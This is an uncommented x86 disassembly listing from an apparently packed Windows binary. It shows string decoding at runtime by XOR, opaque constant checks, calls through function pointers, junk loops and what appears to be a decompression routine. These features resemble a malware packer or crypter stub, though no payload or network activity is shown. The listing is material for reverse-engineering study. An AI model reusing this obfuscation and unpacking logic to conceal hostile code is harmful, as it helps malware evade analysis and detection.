  41f847:	les    ebp,FWORD PTR [esi]
  41f849:	adc    ecx,DWORD PTR [edx+edi*1]
  41f84c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f84d:	repz aas 
  41f84f:	lahf   
  41f850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f851:	inc    ebp
  41f852:	mov    ecx,0x83bc71d
  41f857:	in     al,0x37
  41f859:	mov    bl,0xca
  41f85b:	sbb    cl,cl
  41f85d:	cmp    BYTE PTR [eax],bh
  41f85f:	daa    
  41f860:	retf   0xdc44
  41f863:	int    0x67
  41f865:	adc    bh,BYTE PTR [esi+0x2e]
  41f868:	shr    BYTE PTR [ebx],cl
  41f86a:	inc    ebx
  41f86b:	inc    eax
  41f86c:	mov    WORD PTR [ecx-0x788e5c3],?
  41f872:	xor    ah,BYTE PTR [ebp+0x72fabac5]
  41f878:	xor    al,BYTE PTR [eax]
  41f87a:	sub    eax,edx
  41f87c:	or     ecx,DWORD PTR ds:0x426eb9
  41f882:	mov    ecx,0x75108b3
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429d65
  41f8e9:	mov    edx,DWORD PTR ds:0x42af5d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x430a00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x430a40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	gs sbb eax,0x6674571
  41faaa:	mov    al,0x48
  41faac:	xchg   esp,eax
  41faad:	imul   BYTE PTR [esi+0x135e85cc]
  41fab3:	mov    cl,0x1
  41fab5:	add    BYTE PTR [eax],al
  41fab7:	add    BYTE PTR [ebx+0x3a],al
  41faba:	pop    esp
  41fabb:	inc    esi
  41fabc:	outs   dx,DWORD PTR ds:[esi]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
